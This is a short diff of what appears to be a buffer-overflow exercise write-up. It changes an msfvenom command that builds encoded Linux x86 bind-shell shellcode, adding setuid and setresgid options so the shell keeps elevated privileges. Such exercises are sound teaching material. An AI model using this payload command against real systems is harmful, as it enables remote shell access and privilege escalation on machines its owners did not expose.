@@ -75,7 +75,7 @@ The third exercise consists in overwrite the `RET` address of the stack and fill
 
 ## Create a shellcode using msfvenom
 ```bash
-    msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
+msfvenom -p linux/x86/shell_bind_tcp AppendExit=true PrependSetuid=true PrependSetresgid=true -e x86/alpha_mixed -f python
 ```
 ## Execution server
 ```bash
